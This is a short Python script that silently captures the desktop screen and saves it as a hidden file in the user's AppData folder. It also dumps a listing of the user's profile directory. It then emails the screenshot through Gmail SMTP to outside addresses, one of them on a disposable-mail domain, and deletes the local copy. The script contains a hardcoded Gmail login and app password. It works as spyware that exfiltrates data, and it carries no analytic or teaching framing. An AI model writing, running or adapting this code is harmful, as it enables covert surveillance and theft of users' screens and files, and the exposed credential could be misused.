import pyautogui as pyA
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import time
import os

usu = r"C:\Users\%s" % os.getlogin()
print([d for d in dir(os) if d[0]=='g'])
print(os.getcwdb(),os.getlogin())
#os.system("python -m pip install pyautogui")
os.system(r"dir %USERPROFILE%  > LISTA.TXT")


def send_email(subject, body, sender, recipients, password):
    f = open("%s\\AppData\\Local\\.window.png" % usu, 'rb')
    image_part = MIMEImage(f.read())
    msg = MIMEMultipart()
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = ', '.join(recipients)
    html_part = MIMEText(body)
    msg.attach(html_part)
    msg.attach(image_part)
    smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    smtp_server.login(sender, password)
    res = smtp_server.sendmail(sender, recipients, msg.as_string())
    print(res)
    smtp_server.quit()

if True:
    _f = time.time()
    pyA.moveRel(2, 2, duration = 0.2)
    myScreenshot = pyA.screenshot()
    myScreenshot.save("%s\\AppData\\Local\\.window.png" % usu)
    try:
        send_email("Python - %s" % os.getlogin(),"_%s_" %_f,"isc.emma.itd@gmail.com", ["fimoje6795@chainds.com","emma.kings.8495@gmail.com"], "koacqtdkrlyryaxj")
    except Exception as e:
        print(e)
    os.remove("%s\\AppData\\Local\\.window.png" % usu)
    time.sleep(5)

